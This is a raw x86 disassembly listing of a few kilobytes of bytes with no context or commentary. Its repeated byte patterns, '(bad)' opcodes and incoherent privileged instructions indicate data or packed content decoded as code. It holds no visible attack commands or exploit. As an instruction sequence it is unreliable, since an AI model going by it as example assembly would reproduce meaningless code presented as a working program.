  4027ae:	inc    ebx
  4027af:	bound  esp,QWORD PTR ds:0x41400043
  4027b5:	add    BYTE PTR [eax],al
  4027b7:	add    eax,0x43624062
  4027bc:	inc    ecx
  4027bd:	inc    eax
  4027be:	inc    eax
  4027bf:	inc    eax
  4027c0:	add    eax,0x40624340
  4027c5:	add    eax,0x40664140
  4027ca:	push   0xa8562140
  4027cf:	not    BYTE PTR [eax+0x5e286f48]
  4027d5:	inc    ebx
  4027d6:	lahf   
  4027d7:	lds    edi,FWORD PTR [edx+0x24e105]
  4027dd:	(bad)  [ebx]
  4027df:	dec    edi
  4027e0:	fs retf 
  4027e2:	fld    DWORD PTR [eax+0x60]
  4027e5:	sub    DWORD PTR [edi+0x40],0xf
  4027e9:	push   ecx
  4027ea:	shl    DWORD PTR [ebx+ebx*4],0x92
  4027ee:	push   0x43c841
  4027f3:	add    eax,0x41107840
  4027f8:	bound  eax,QWORD PTR [eax+0x40]
  4027fb:	sldt   WORD PTR [eax-0x34]
  4027ff:	js     0x402863
  402801:	add    eax,0x40664143
  402806:	inc    ebx
  402807:	add    BYTE PTR [ecx+0x5],al
  40280a:	js     0x40284c
  40280c:	bound  eax,QWORD PTR [eax+0x0]
  40280f:	inc    eax
  402810:	xor    eax,0x73832a87
  402815:	bound  eax,QWORD PTR [eax+0x62]
  402818:	jno    0x4027a4
  40281a:	sub    al,0x7d
  40281c:	and    BYTE PTR [edi],0x34
  40281f:	mov    dx,0x4026
  402823:	xor    DWORD PTR [ebx-0x55],0x64c3bcfd
  40282a:	aaa    
  40282b:	sub    eax,DWORD PTR [ebx+0x4163c3bc]
  402831:	scas   al,BYTE PTR es:[edi]
  402832:	les    ebp,FWORD PTR [ebp-0x5e]
  402835:	cmp    BYTE PTR [edi+0x48a45435],0x81
  40283c:	xchg   ebx,eax
  40283d:	arpl   WORD PTR [edi+0x71fafe69],di
  402843:	pop    eax
  402844:	pop    edi
  402845:	bound  edi,QWORD PTR [edi+0x40ac4f3d]
  40284b:	add    DWORD PTR [ecx+0x43],0x62054040
  402852:	inc    ecx
  402853:	inc    ebx
  402854:	add    BYTE PTR [eax+0x0],al
  402857:	bound  eax,QWORD PTR ds:0x40621040
  40285d:	inc    ebx
  40285e:	inc    ecx
  40285f:	add    eax,0x4340
  402864:	add    eax,0x404162
  402869:	add    BYTE PTR [eax+0x43],al
  40286c:	inc    eax
  40286d:	add    eax,0x8850b3a1
  402872:	inc    esp
  402873:	sub    eax,0x20c00d7a
  402878:	lds    ebx,FWORD PTR [eax-0x76dbe6b6]
  40287e:	add    BYTE PTR [esi+0x44],0x60
  402882:	or     al,0x64
  402884:	inc    eax
  402885:	xor    DWORD PTR [ebx+0x4f],esi
  402888:	mov    DWORD PTR [ebx-0x35],edi
  40288b:	pop    es
  40288c:	das    
  40288d:	add    DWORD PTR [eax+0x40dd6885],edx
  402893:	mov    ds:0xc3cbc8e2,eax
  402898:	push   esi
  402899:	push   ss
  40289a:	adc    bh,0xa8
  40289d:	add    DWORD PTR [ebx+0x2b4c47ae],0xa04440e1
  4028a7:	lds    esp,FWORD PTR [eax]
  4028a9:	outs   dx,BYTE PTR ds:[esi]
  4028aa:	inc    eax
  4028ab:	add    BYTE PTR [eax],al
  4028ad:	inc    ecx
  4028ae:	inc    ebx
  4028af:	add    eax,0x41784062
  4028b4:	inc    eax
  4028b5:	inc    eax
  4028b6:	add    BYTE PTR [edi],cl
  4028b8:	bound  eax,QWORD PTR [ebx+0x0]
  4028bb:	add    eax,0x25006240
  4028c0:	inc    eax
  4028c1:	add    eax,0x40254143
  4028c6:	add    eax,0x40620000
  4028cb:	or     ch,BYTE PTR [ebp-0x7e]
  4028ce:	xchg   ebx,eax
  4028cf:	mov    cl,0x62
  4028d1:	or     eax,0x2e402f44
  4028d6:	cmp    BYTE PTR [eax+ebp*4],0xac
  4028da:	inc    eax
  4028db:	xchg   ebx,eax
  4028dc:	cs cs in eax,0x47
  4028e0:	adc    DWORD PTR [edx+0x2d],esp
  4028e3:	push   esp
  4028e4:	inc    eax
  4028e5:	add    DWORD PTR [edi+0x3c],ecx
  4028e8:	mov    WORD PTR [esp+ecx*8+0x2e],es
  4028ec:	sub    DWORD PTR [ebp+0x43],edi
  4028f2:	inc    ecx
  4028f3:	inc    eax
  4028f4:	bound  esp,QWORD PTR [esi+0x0]
  4028f7:	inc    eax
  4028f8:	add    eax,0x5400000
  4028fd:	inc    ecx
  4028fe:	inc    eax
  4028ff:	inc    eax
  402900:	bound  esp,QWORD PTR ds:0x25050043
  402906:	inc    ecx
  402907:	inc    ebx
  402908:	inc    eax
  402909:	test   BYTE PTR [eax+0x0],al
  40290c:	bound  ebx,QWORD PTR [eax+0x62]
  40290f:	inc    ecx
  402910:	inc    eax
  402911:	inc    esi
  402912:	push   eax
  402913:	or     eax,0x40036220
  402918:	jg     0x40294d
  40291a:	xor    BYTE PTR [edx+0x15],al
  40291d:	dec    eax
  40291e:	out    0x27,eax
  402920:	and    DWORD PTR [eax+0x4d],0xffffff84
  402924:	test   al,0x10
  402926:	dec    esp
  402927:	shl    BYTE PTR [ecx-0x47],0xac
  40292b:	pop    eax
  40292c:	adc    bl,cl
  40292e:	sub    al,0x40
  402930:	add    eax,eax
  402932:	xchg   edx,eax
  402933:	push   esp
  402934:	dec    esp
  402935:	inc    eax
  402936:	icebp  
  402937:	xor    dh,BYTE PTR [ebx+0x55]
  40293a:	adc    BYTE PTR [edx+0x40],ah
  40293d:	inc    ecx
  40293e:	and    eax,0x40000500
  402943:	inc    ebx
  402944:	add    eax,0x40624041
  402949:	inc    ebx
  40294a:	add    eax,0x43402541
  40294f:	bound  eax,QWORD PTR [eax+0x43]
  402952:	int3   
  402953:	inc    eax
  402954:	bound  eax,QWORD PTR [eax]
  402956:	inc    ecx
  402957:	inc    eax
  402958:	inc    eax
  402959:	add    eax,0x4110bf05
  40295e:	mov    eax,ds:0x33844085
  402963:	je     0x4029b3
  402965:	jge    0x4028e8
  402967:	dec    esp
  402968:	and    DWORD PTR [edx],esi
  40296a:	add    dl,al
  40296c:	(bad)
  40296f:	bound  eax,QWORD PTR [eax+0xb]
  402972:	mov    ecx,0x4062cd62
  402977:	and    eax,0x5406600
  40297c:	inc    ebx
  40297d:	inc    ecx
  40297e:	inc    eax
  40297f:	inc    eax
  402980:	inc    ebx
  402981:	add    BYTE PTR [eax],al
  402983:	add    BYTE PTR [edx-0x34],ah
  402986:	inc    eax
  402987:	add    eax,0x40004041
  40298c:	inc    ecx
  40298d:	int3   
  40298e:	add    BYTE PTR [ebx-0x7c],al
  402991:	add    eax,0x5406240
  402996:	bound  esp,QWORD PTR [edx+0x42]
  402999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40299a:	sub    eax,0x1238c081
  40299f:	jg     0x4029f9
  4029a1:	or     eax,0x248c6940
  4029a6:	inc    ebp
  4029a7:	jl     0x402a12
  4029a9:	bound  esp,QWORD PTR [eax+0x5]
  4029ac:	dec    esi
  4029ad:	push   esi
  4029ae:	and    dl,BYTE PTR [edx+0x77]
  4029b1:	inc    eax
  4029b2:	inc    eax
  4029b3:	mov    DWORD PTR [eax+0x74],eax
  4029b6:	aad    0x21
  4029b8:	xor    al,0xfd
  4029ba:	inc    eax
  4029bb:	adc    DWORD PTR [edi+0x1e],0xffffffcd
  4029bf:	cmp    BYTE PTR [eax+0x42],al
  4029c2:	jnp    0x402a26
  4029c4:	cmp    BYTE PTR [eax+0x62],al
  4029c7:	pop    eax
  4029c8:	inc    ecx
  4029c9:	add    eax,0x40404340
  4029ce:	inc    ebx
  4029cf:	inc    eax
  4029d0:	test   BYTE PTR [eax],al
  4029d2:	add    eax,0x40624041
  4029d7:	inc    eax
  4029d8:	add    BYTE PTR [edx+0x5],ah
  4029db:	inc    ebx
  4029dc:	add    BYTE PTR [eax+0x78],al
  4029df:	inc    ecx
  4029e0:	add    BYTE PTR [eax+0x41],bl
  4029e3:	bound  edi,QWORD PTR [edx+0x40]
  4029e6:	adc    eax,0x8140e641
  4029eb:	and    DWORD PTR [edx+0x2a],0xffffffcb
  4029ef:	jl     0x4029d0
  4029f1:	cmp    BYTE PTR [edi+0x46414088],ch
  4029f7:	ret    
  4029f8:	add    DWORD PTR [eax+0x60],0x50
  4029fc:	fsubr  QWORD PTR [esi+0x51]
  4029ff:	dec    eax
  402a00:	inc    eax
  402a01:	test   BYTE PTR [eax],al
  402a03:	int3   
  402a04:	bound  eax,QWORD PTR ds:0xcc840f41
  402a0a:	inc    ebx
  402a0b:	add    BYTE PTR [eax+0x0],al
  402a0e:	inc    eax
  402a0f:	inc    eax
  402a10:	inc    eax
  402a11:	int3   
  402a12:	add    BYTE PTR ds:0x62404341,al
  402a18:	pop    eax
  402a19:	add    BYTE PTR [ebx+0x40],al
  402a1c:	bound  ecx,QWORD PTR [edi]
  402a1e:	inc    eax
  402a1f:	jne    0x402a51
  402a21:	add    eax,0xc3e47e82
  402a26:	or     bl,dh
  402a28:	inc    eax
  402a29:	ins    BYTE PTR es:[edi],dx
  402a2a:	push   ebp
  402a2b:	cmp    BYTE PTR [edx-0x35],dl
  402a2e:	retf   
  402a2f:	bound  esi,QWORD PTR [eax+0x3]
  402a32:	or     ah,BYTE PTR [edx+0x28]
  402a35:	adc    al,0x40
  402a37:	mov    ebx,0x40542240
  402a3c:	inc    ecx
  402a3d:	push   edx
  402a3e:	mov    al,ds:0xbf81401f
  402a43:	sub    al,0x2a
  402a45:	enter  0x3f81,0x72
  402a49:	sbb    DWORD PTR [eax],ebx
  402a4b:	loopne 0x402a8e
  402a4d:	push   eax
  402a4e:	dec    ecx
  402a4f:	leave  
  402a50:	inc    eax
  402a51:	add    DWORD PTR [eax],edx
  402a53:	cmp    al,0x0
  402a55:	add    BYTE PTR [eax+0x40],al
  402a58:	cmovno eax,DWORD PTR ds:0x40056243
  402a5f:	int3   
  402a60:	add    ah,cl
  402a62:	inc    eax
  402a63:	inc    eax
  402a64:	bound  eax,QWORD PTR [ecx+0x0]
  402a67:	add    BYTE PTR [edi],cl
  402a69:	inc    ebx
  402a6a:	inc    eax
  402a6b:	inc    eax
  402a6c:	add    BYTE PTR [ecx+0x43],al
  402a6f:	add    eax,0x40256240
  402a74:	bound  eax,QWORD PTR [eax]
  402a76:	inc    ecx
  402a77:	xor    eax,0xe47aac23
  402a7c:	dec    ebx
  402a7d:	popa   
  402a7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a7f:	ss sub al,0xd8
  402a82:	inc    eax
  402a83:	cmp    BYTE PTR [edi],0xab
  402a86:	lods   al,BYTE PTR ds:[esi]
  402a87:	test   al,0xf8
  402a89:	jmp    0x402abf
  402a8b:	and    edi,DWORD PTR [eax-0x80]
  402a8e:	fs add eax,0x4140cc00
  402a94:	inc    eax
  402a95:	inc    ebx
  402a96:	bound  esp,QWORD PTR ds:0x41400043
  402a9c:	add    BYTE PTR [eax],al
  402a9e:	add    eax,0x43624062
  402aa3:	inc    ecx
  402aa4:	inc    eax
  402aa5:	inc    eax
  402aa6:	inc    eax
  402aa7:	add    eax,0x40624340
  402aac:	add    eax,0x40664140
  402ab1:	add    cl,BYTE PTR [esi+edi*2+0x40]
  402ab5:	inc    esp
  402ab6:	inc    esp
  402ab7:	jae    0x402a3d
  402ab9:	sub    dl,BYTE PTR [ecx]
  402abb:	push   esi
  402abc:	sub    BYTE PTR [ecx],al
  402abe:	or     eax,0xec032444
  402ac3:	xlat   BYTE PTR ds:[ebx]
  402ac4:	inc    eax
  402ac5:	inc    esi
  402ac6:	push   ebx
  402ac7:	inc    edx
  402ac8:	push   ebp
  402ac9:	and    BYTE PTR [edi],dh
  402acb:	(bad)  
  402acc:	cmc    
  402acd:	add    BYTE PTR [ecx+esi*2-0x79],al
  402ad1:	push   eax
  402ad2:	adc    ebx,DWORD PTR ds:0x9441bb5a
  402ad8:	mov    eax,0x43e3350c
  402add:	add    BYTE PTR ds:0x41107840,al
  402ae3:	bound  eax,QWORD PTR [eax+0x40]
  402ae6:	sldt   WORD PTR [eax-0x34]
  402aea:	js     0x402b4e
  402aec:	add    eax,0x40664143
  402af1:	inc    ebx
  402af2:	add    BYTE PTR [ecx+0x5],al
  402af5:	js     0x402b37
  402af7:	bound  eax,QWORD PTR [eax+0x0]
  402afa:	inc    eax
  402afb:	inc    esi
  402afc:	add    eax,0x69fd682d
  402b01:	inc    ecx
  402b02:	xchg   ebp,eax
  402b03:	xor    esp,eax
  402b05:	arpl   WORD PTR [edi+0x4eb07d62],ax
  402b0b:	inc    ecx
  402b0c:	xchg   DWORD PTR [esp+edi*1+0x4c],esp
  402b10:	xor    al,0x41
  402b12:	(bad)  
  402b13:	shl    eax,cl
  402b15:	test   al,0x83
  402b17:	and    BYTE PTR [ebp+eax*1+0x7b],al
  402b1b:	adc    al,BYTE PTR [edx]
  402b1d:	dec    ebx
  402b1e:	sbb    eax,0x478c221b
  402b23:	ins    DWORD PTR es:[edi],dx
  402b24:	xor    BYTE PTR [ebx],ah
  402b26:	push   0xffffffa8
  402b28:	data16 arpl WORD PTR [esi+0x73],bp
  402b2c:	inc    ecx
  402b2d:	inc    ebx
  402b2e:	inc    eax
  402b2f:	inc    eax
  402b30:	add    eax,0x434162
  402b35:	inc    eax
  402b36:	add    BYTE PTR [edx+0x5],ah
  402b39:	inc    eax
  402b3a:	adc    BYTE PTR [edx+0x40],ah
  402b3d:	inc    ebx
  402b3e:	inc    ecx
  402b3f:	add    eax,0x4340
  402b44:	add    eax,0x404162
  402b49:	add    BYTE PTR [eax+0x43],al
  402b4c:	inc    eax
  402b4d:	add    eax,0x102a4317
  402b52:	pop    eax
  402b53:	cmc    
  402b54:	jnp    0x402bc7
  402b56:	adc    eax,0xc6558841
  402b5c:	stos   BYTE PTR es:[edi],al
  402b5d:	inc    ebp
  402b5e:	jo     0x402b71
  402b60:	cmp    BYTE PTR [edi-0xecdb067],dl
  402b66:	and    eax,0x45
  402b69:	pop    edx
  402b6a:	inc    eax
  402b6b:	add    BYTE PTR [eax],al
  402b6d:	inc    ecx
  402b6e:	inc    ebx
  402b6f:	add    eax,0x41784062
  402b74:	inc    eax
  402b75:	inc    eax
  402b76:	add    BYTE PTR [edi],cl
  402b78:	bound  eax,QWORD PTR [ebx+0x0]
  402b7b:	add    eax,0x25006240
  402b80:	inc    eax
  402b81:	add    eax,0x40254143
  402b86:	add    eax,0x3c620000
  402b8b:	inc    ecx
  402b8c:	mov    eax,DWORD PTR [ecx+0x7a]
  402b8f:	inc    ebx
  402b90:	xchg   ebp,eax
  402b92:	pop    es
  402b93:	inc    esp
  402b94:	jb     0x402b47
  402b96:	xchg   BYTE PTR [edx+0x44],dl
  402b99:	mov    dl,0x1c
  402b9b:	cmp    BYTE PTR [esi],al
  402b9d:	push   ebx
  402b9e:	sub    DWORD PTR [edx+0x4b],ebp
  402ba1:	leave  
  402ba2:	arpl   bx,ax
  402ba4:	test   al,0x5f
  402ba6:	cs inc ebx
  402ba8:	shl    DWORD PTR [edx-0x3f],cl
  402bab:	dec    esp
  402bac:	pop    edx
  402bad:	inc    edx
  402bae:	sub    al,BYTE PTR [ebx+0x0]
  402bb1:	add    BYTE PTR [eax],al
  402bb3:	inc    ecx
  402bb4:	inc    eax
  402bb5:	bound  esp,QWORD PTR [esi+0x0]
  402bb8:	inc    eax
  402bb9:	add    eax,0x5400000
  402bbe:	inc    ecx
  402bbf:	inc    eax
  402bc0:	inc    eax
  402bc1:	bound  esp,QWORD PTR ds:0x25050043
  402bc7:	inc    ecx
  402bc8:	inc    ebx
  402bc9:	inc    eax
  402bca:	test   BYTE PTR [eax+0x0],al
  402bcd:	bound  ebx,QWORD PTR [eax+0x62]
  402bd0:	inc    ecx
  402bd1:	inc    eax
  402bd2:	lock jmp FWORD PTR [edx]
  402bd5:	test   al,0x2
  402bd7:	test   eax,0xa859021b
  402bdc:	inc    ebp
  402bdd:	adc    bl,cl
  402bdf:	call   0x10756327
  402be4:	and    eax,0x11a64748
  402be9:	inc    edi
  402bea:	inc    edi
  402beb:	dec    esp
  402bec:	xchg   edx,eax
  402bed:	inc    ecx
  402bee:	outs   dx,BYTE PTR ds:[esi]
  402bef:	cmp    edi,edi
  402bf1:	sbb    BYTE PTR [esi+0x1079483b],0x62
  402bf8:	inc    eax
  402bf9:	inc    ecx
  402bfa:	and    eax,0x40000500
  402bff:	inc    ebx
  402c00:	add    eax,0x40624041
  402c05:	inc    ebx
  402c06:	add    eax,0x43402541
  402c0b:	bound  eax,QWORD PTR [eax+0x43]
  402c0e:	int3   
  402c0f:	inc    eax
  402c10:	bound  eax,QWORD PTR [eax]
  402c12:	inc    ecx
  402c13:	inc    eax
  402c14:	inc    eax
  402c15:	add    eax,0xe857805
  402c1a:	or     BYTE PTR [eax],dl
  402c1c:	loope  0x402c79
  402c1e:	lods   al,BYTE PTR ds:[esi]
  402c1f:	bound  ebx,QWORD PTR [esi-0xf]
  402c22:	les    ebp,FWORD PTR ds:0x28628740
  402c28:	sbb    al,BYTE PTR [edi-0x76]
  402c2b:	test   al,0x40
  402c2d:	inc    eax
  402c2e:	inc    esp
  402c2f:	mov    al,ds:0x406eb08b
  402c34:	inc    eax
  402c35:	inc    eax
  402c36:	inc    eax
  402c37:	bound  esp,QWORD PTR [edx+0x7a]
  402c3a:	pop    eax
  402c3b:	add    DWORD PTR [ecx-0x50],eax
  402c3e:	sub    BYTE PTR ds:0x25406207,al
  402c44:	add    BYTE PTR [esi+0x40],ah
  402c47:	add    eax,0x40404143
  402c4c:	inc    ebx
  402c4d:	add    BYTE PTR [eax],al
  402c4f:	add    BYTE PTR [edx-0x34],ah
  402c52:	inc    eax
  402c53:	add    eax,0x40004041
  402c58:	inc    ecx
  402c59:	int3   
  402c5a:	add    BYTE PTR [ebx-0x7c],al
  402c5d:	add    eax,0x5406240
  402c62:	bound  eax,QWORD PTR [ebx+0x7]
  402c65:	add    eax,DWORD PTR [ecx-0x19]
  402c68:	pop    ebx
  402c69:	xchg   DWORD PTR [edi-0x50],edi
  402c6c:	push   ebx
  402c6d:	xor    al,al
  402c6f:	pop    edx
  402c70:	inc    ecx
  402c71:	inc    eax
  402c72:	loop   0x402ca0
  402c74:	add    ebp,DWORD PTR [eax]
  402c76:	inc    ebp
  402c77:	mov    esi,0x8ad1c099
  402c7c:	jmp    0x402cbe
  402c7e:	xchg   DWORD PTR [eax+edx*8+0x26516a17],edi
  402c85:	sub    ah,BYTE PTR [edx-0x3b]
  402c88:	popa   
  402c89:	bound  esp,QWORD PTR [edx+0x41586240]
  402c8f:	add    eax,0x40404340
  402c94:	inc    ebx
  402c95:	inc    eax
  402c96:	test   BYTE PTR [eax],al
  402c98:	add    eax,0x40624041
  402c9d:	inc    eax
  402c9e:	add    BYTE PTR [edx+0x5],ah
  402ca1:	inc    ebx
  402ca2:	add    BYTE PTR [eax+0x78],al
  402ca5:	inc    ecx
  402ca6:	add    BYTE PTR [eax+0x41],bl
  402ca9:	(bad)  
  402cab:	add    DWORD PTR [edi+0x34],0x6010887
  402cb2:	xor    DWORD PTR [eax+0x71],edx
  402cb5:	inc    eax
  402cb6:	inc    ecx
  402cb7:	std    
  402cb8:	xchg   DWORD PTR [edx],edi
  402cba:	push   eax
  402cbb:	sbb    DWORD PTR [eax+0x484e9242],0x62ddf7a1
  402cc5:	inc    ebp
  402cc6:	test   al,0xe0
  402cc8:	or     eax,0x54059741
  402ccd:	sub    al,0x5a
  402ccf:	xor    al,0xcb
  402cd1:	mov    dl,0x48
  402cd3:	jg     0x402cd1
  402cd5:	jge    0x402cac
  402cd7:	stos   DWORD PTR es:[edi],eax
  402cd8:	push   ecx
  402cd9:	inc    eax
  402cda:	test   BYTE PTR [eax],al
  402cdc:	int3   
  402cdd:	bound  eax,QWORD PTR ds:0xcc840f41
  402ce3:	inc    ebx
  402ce4:	add    BYTE PTR [eax+0x0],al
  402ce7:	inc    eax
  402ce8:	inc    eax
  402ce9:	inc    eax
  402cea:	int3   
  402ceb:	add    BYTE PTR ds:0x62404341,al
  402cf1:	pop    eax
  402cf2:	add    BYTE PTR [ebx+0x40],al
  402cf5:	bound  ecx,QWORD PTR [edi]
  402cf7:	inc    eax
  402cf8:	sub    BYTE PTR [edx-0x77],dh
  402cfb:	add    DWORD PTR [esi],ebp
  402cfd:	leave  
  402cfe:	mov    esp,0x3d349635
  402d03:	and    BYTE PTR [ebp+0x31435a48],bh
  402d09:	push   eax
  402d0a:	and    bl,0x63
  402d0d:	and    bh,BYTE PTR [edi+0x400000b0]
  402d13:	inc    eax
  402d14:	cmovno eax,DWORD PTR ds:0x40056243
  402d1b:	int3   
  402d1c:	add    ah,cl
  402d1e:	inc    eax
  402d1f:	inc    eax
  402d20:	bound  eax,QWORD PTR [ecx+0x0]
  402d23:	add    BYTE PTR [edi],cl
  402d25:	inc    ebx
  402d26:	inc    eax
  402d27:	inc    eax
  402d28:	add    BYTE PTR [ecx+0x43],al
  402d2b:	add    eax,0x40256240
  402d30:	bound  eax,QWORD PTR [eax]
  402d32:	ja     0x402da4
  402d34:	sub    al,0x60
  402d36:	dec    ebp
  402d37:	aad    0x68
  402d39:	cmp    eax,0x4c256b
  402d3e:	cwde   
  402d3f:	int    0x44
  402d41:	ret    
  402d42:	aas    
  402d43:	push   ecx
  402d44:	sbb    DWORD PTR [ebx+eax*2+0x6f],0xb15a50bc
  402d4c:	(bad)  
  402d4e:	enter  0x5,0xcc
  402d52:	inc    eax
  402d53:	inc    ecx
  402d54:	inc    eax
  402d55:	inc    ebx
  402d56:	bound  esp,QWORD PTR ds:0x41400043
  402d5c:	add    BYTE PTR [eax],al
  402d5e:	add    eax,0x43624062
  402d63:	inc    ecx
  402d64:	inc    eax
  402d65:	inc    eax
  402d66:	inc    eax
  402d67:	add    eax,0x40624340
  402d6c:	add    eax,0x40664140
  402d71:	inc    edx
  402d72:	push   0xffffffc9
  402d74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d75:	or     DWORD PTR ds:0x5152ac4b,eax
  402d7b:	dec    eax
  402d7c:	xchg   edx,eax
  402d7d:	mov    cl,0xbb
  402d7f:	test   al,0xcb
  402d81:	xchg   edx,eax
  402d82:	cmp    al,0x5
  402d84:	add    BYTE PTR ds:0x8156369,cl
  402d8a:	addr16 retf 
  402d8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d8d:	xchg   ebx,eax
  402d8e:	xchg   edx,esi
  402d90:	push   ebx
  402d91:	pop    edx
  402d92:	inc    esp
  402d93:	dec    ebp
  402d94:	pop    ebx
  402d95:	inc    ebx
  402d96:	add    BYTE PTR ds:0x41107840,al
  402d9c:	bound  eax,QWORD PTR [eax+0x40]
  402d9f:	sldt   WORD PTR [eax-0x34]
  402da3:	js     0x402e07
  402da5:	add    eax,0x40664143
  402daa:	inc    ebx
  402dab:	add    BYTE PTR [ecx+0x5],al
  402dae:	js     0x402df0
  402db0:	bound  eax,QWORD PTR [eax+0x0]
  402db3:	inc    eax
  402db4:	dec    esi
  402db5:	push   esi
  402db6:	gs add eax,ebp
  402db9:	lods   al,BYTE PTR ds:[esi]
  402dba:	inc    edx
  402dbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402dbc:	rol    BYTE PTR [ecx+0x6d87674b],cl
  402dc2:	aam    0xf1
  402dc4:	out    dx,eax
  402dc5:	jne    0x402df7
  402dc7:	mov    BYTE PTR [ecx],dl
  402dc9:	inc    edi
  402dca:	adc    eax,0xd8803853
  402dcf:	fdivr  DWORD PTR [esi]
  402dd1:	sbb    al,0x29
  402dd3:	jecxz  0x402e17
  402dd5:	and    bh,BYTE PTR [ebx+0x67]
  402dd8:	xchg   edx,eax
  402dd9:	fld    DWORD PTR [eax+0x1d]
  402ddc:	xor    DWORD PTR [edx-0x7],esp
  402ddf:	inc    edx
  402de0:	mov    al,ds:0x47864008
  402de5:	add    DWORD PTR [edi],eax
  402de7:	rcr    BYTE PTR [edx+0x5f],0x40
  402deb:	inc    ebp
  402dec:	fmulp  st(0),st
  402dee:	inc    ecx
  402def:	inc    ebx
  402df0:	inc    eax
  402df1:	inc    eax
  402df2:	add    eax,0x434162
  402df7:	inc    eax
  402df8:	add    BYTE PTR [edx+0x5],ah
  402dfb:	inc    eax
  402dfc:	adc    BYTE PTR [edx+0x40],ah
  402dff:	inc    ebx
  402e00:	inc    ecx
  402e01:	add    eax,0x4340
  402e06:	add    eax,0x404162
  402e0b:	add    BYTE PTR [eax+0x43],al
  402e0e:	inc    eax
  402e0f:	add    eax,0x21c5e13c
  402e14:	cmp    BYTE PTR [edx+0x36],cl
  402e17:	and    DWORD PTR ds:0xacd88710,0xac7c525d
  402e21:	jmp    0xad84ea40
  402e26:	push   ecx
  402e27:	add    edi,DWORD PTR [ecx]
  402e29:	fstp   TBYTE PTR [esi]
  402e2b:	test   al,0xe7
  402e2d:	or     eax,DWORD PTR [ecx-0x37]
  402e30:	pop    ecx
  402e31:	test   al,0xbf
  402e33:	adc    BYTE PTR [ecx+ebx*2],ah
  402e36:	cmp    DWORD PTR [ecx+0x4cbf1224],eax
  402e3c:	mov    edi,0x6baf80df
  402e41:	pushf  
  402e42:	inc    eax
  402e43:	add    BYTE PTR [eax],al
  402e45:	inc    ecx
  402e46:	inc    ebx
  402e47:	add    eax,0x41784062
  402e4c:	inc    eax
  402e4d:	inc    eax
  402e4e:	add    BYTE PTR [edi],cl
  402e50:	bound  eax,QWORD PTR [ebx+0x0]
  402e53:	add    eax,0x25006240
  402e58:	inc    eax
  402e59:	add    eax,0x40254143
  402e5e:	add    eax,0xbe620000
  402e63:	inc    edx
  402e64:	lods   al,BYTE PTR ds:[esi]
  402e65:	xchg   BYTE PTR ds:0xac9fcd58,dl
  402e6b:	mov    edi,0x870dff3d
  402e70:	test   al,0x62
  402e72:	lds    ebx,FWORD PTR [ebx+eax*8+0xb]
  402e76:	repnz inc esp
  402e78:	inc    eax
  402e79:	add    DWORD PTR [edi+0x2f004662],eax
  402e7f:	test   DWORD PTR [edx],ebp
  402e81:	inc    ebx
  402e82:	add    BYTE PTR [eax],al
  402e84:	add    BYTE PTR [ecx+0x40],al
  402e87:	bound  esp,QWORD PTR [esi+0x0]
  402e8a:	inc    eax
  402e8b:	add    eax,0x5400000
  402e90:	inc    ecx
  402e91:	inc    eax
  402e92:	inc    eax
  402e93:	bound  esp,QWORD PTR ds:0x25050043
  402e99:	inc    ecx
  402e9a:	inc    ebx
  402e9b:	inc    eax
  402e9c:	test   BYTE PTR [eax+0x0],al
  402e9f:	bound  ebx,QWORD PTR [eax+0x62]
  402ea2:	inc    ecx
  402ea3:	inc    eax
  402ea4:	stos   DWORD PTR es:[edi],eax
  402ea5:	inc    ebx
  402ea6:	or     dh,BYTE PTR [edi]
  402ea8:	sar    DWORD PTR [edx+ebp*1+0x42],1
  402eac:	and    al,0x1b
  402eae:	rol    BYTE PTR [eax+0x2b],1
  402eb1:	push   edi
  402eb2:	cmp    BYTE PTR [ecx],0xe3
  402eb5:	mov    WORD PTR [edx+0x40],ss
  402eb8:	inc    esi
  402eb9:	xchg   ecx,eax
  402eba:	adc    BYTE PTR [edx+0x40],ah
  402ebd:	inc    ecx
  402ebe:	and    eax,0x40000500
  402ec3:	inc    ebx
  402ec4:	add    eax,0x40624041
  402ec9:	inc    ebx
  402eca:	add    eax,0x43402541
  402ecf:	bound  eax,QWORD PTR [eax+0x43]
  402ed2:	int3   
  402ed3:	inc    eax
  402ed4:	bound  eax,QWORD PTR [eax]
  402ed6:	inc    ecx
  402ed7:	inc    eax
  402ed8:	inc    eax
  402ed9:	add    eax,0x50282c05
  402ede:	push   edx
  402edf:	push   ebp
  402ee0:	inc    ebx
  402ee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ee2:	inc    ebp
  402ee3:	dec    eax
  402ee4:	bound  eax,QWORD PTR [edx-0x3c]
  402ee7:	cmp    al,0xa8
  402ee9:	mov    dh,BYTE PTR [edx+eax*4-0x26b0b1ff]
  402ef0:	lods   al,BYTE PTR ds:[esi]
  402ef1:	stos   BYTE PTR es:[edi],al
  402ef2:	bound  esp,QWORD PTR [ecx]
  402ef4:	nop
  402ef5:	and    dh,ch
  402ef7:	je     0x402f36
  402ef9:	in     al,0x42
  402efb:	retf   0xe03e
  402efe:	(bad)  
  402eff:	(bad)  
  402f01:	loope  0x402f33
  402f03:	add    esi,DWORD PTR ds:0xacb454bc
  402f09:	inc    esi
  402f0a:	ja     0x402f25
  402f0c:	ins    DWORD PTR es:[edi],dx
  402f0d:	test   al,0xa0
  402f0f:	adc    eax,0x8540f94b
  402f14:	add    BYTE PTR [edx+0x28],0xc9
  402f18:	bound  eax,QWORD PTR [eax+0x25]
  402f1b:	add    BYTE PTR [esi+0x40],ah
  402f1e:	add    eax,0x40404143
  402f23:	inc    ebx
  402f24:	add    BYTE PTR [eax],al
  402f26:	add    BYTE PTR [edx-0x34],ah
  402f29:	inc    eax
  402f2a:	add    eax,0x40004041
  402f2f:	inc    ecx
  402f30:	int3   
  402f31:	add    BYTE PTR [ebx-0x7c],al
  402f34:	add    eax,0x5406240
  402f39:	bound  edx,QWORD PTR [eax-0x61]
  402f3c:	add    ebp,DWORD PTR [ebx-0x4fdfd59d]
  402f42:	xchg   esp,eax
  402f43:	das    
  402f44:	sub    BYTE PTR [edi],cl
  402f46:	outs   dx,BYTE PTR ds:[esi]
  402f47:	inc    edx
  402f48:	push   cs
  402f49:	inc    ecx
  402f4a:	sub    eax,0x240242d8
  402f4f:	or     DWORD PTR [ebp+0x10776442],ecx
  402f55:	and    DWORD PTR [eax+edx*8+0x62],eax
  402f59:	cld    
  402f5a:	test   al,0x48
  402f5c:	add    DWORD PTR [esi],eax
